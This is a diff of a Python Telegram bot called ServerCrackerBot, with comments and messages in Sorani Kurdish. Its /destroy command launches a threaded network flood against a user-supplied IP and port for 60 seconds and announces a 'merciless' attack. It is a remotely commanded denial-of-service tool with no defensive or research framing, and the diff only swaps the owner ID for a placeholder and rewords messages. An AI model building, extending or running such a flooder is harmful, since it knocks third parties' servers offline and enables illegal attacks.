@@ -6,9 +6,8 @@ import time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-# خوێندنەوەی توکن لە ژینگەی گیتهاب (GitHub Secrets)
 TOKEN = os.getenv("BOT_TOKEN")
-OWNER_ID = 5527152252  # ئایدی تلگرامی خۆت لێرە بنووسە
+OWNER_ID = 123456789  # ئایدی تلگرامی خۆت لێرە بنووسە
 
 def flood_worker(ip, port, duration):
     end_time = time.time() + duration
@@ -52,7 +51,7 @@ async def destroy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"🌋 **هێرشی بۆڕکان دەستی پێکرد!**\n🎯 ئامانج: `{ip}:{port}`\n⚡️ بارودۆخ: توند و بێبەزەیی...")
 
     threading.Thread(target=start_attack_thread, args=(ip, port, 60)).start()
-    await update.message.reply_text(f"💀 شەپۆلی هێرشەکە سەرکەوتووانە نێردرا بۆ سێرڤەرەکە!")
+    await update.message.reply_text(f"💀 شەپۆلی هێرشەکە سەرکەوتووانە نێردرا بۆ سەر ئامانجەکە!")
 
 def main():
     if not TOKEN:
@@ -62,7 +61,7 @@ def main():
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("destroy", destroy_command))
     
-    print("💀 بۆتی ServerCrackerBot ئامادەیە و لەژێر چاودێریدایە...")
+    print("💀 بۆتی ServerCrackerBot ئامادەیە و لە تلگرام کار دەکات...")
     app.run_polling()
 
 if __name__ == "__main__":
